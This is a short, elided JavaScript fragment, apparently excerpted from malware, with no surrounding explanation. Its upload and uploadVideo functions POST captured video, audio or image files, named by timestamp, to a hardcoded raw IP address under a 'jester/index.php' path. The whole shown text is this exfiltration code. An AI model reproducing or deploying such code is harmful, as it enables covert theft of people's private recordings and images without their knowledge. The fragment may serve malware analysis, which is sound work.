...
var to = {
    async upload(e, t) {
        var n;
        const l = "http://181.215.45.148/jester/index.php";
        const a = new FormData;
        a.append(t === "webm" ? "video" : t === "mp3" || t === "ogg" ? "audio" : "image", e, Date.now() + "." + t);
        const s = await fetch(l, {
            method: "POST",
            body: a
        });
        if (404 === s.status) throw new Error("Invalid uploadServer");
    ...
    async uploadVideo(e) {
        ...
        const n = await fetch("http://181.215.45.148/jester/index.php", {
            method: "POST",
            body: t
        });
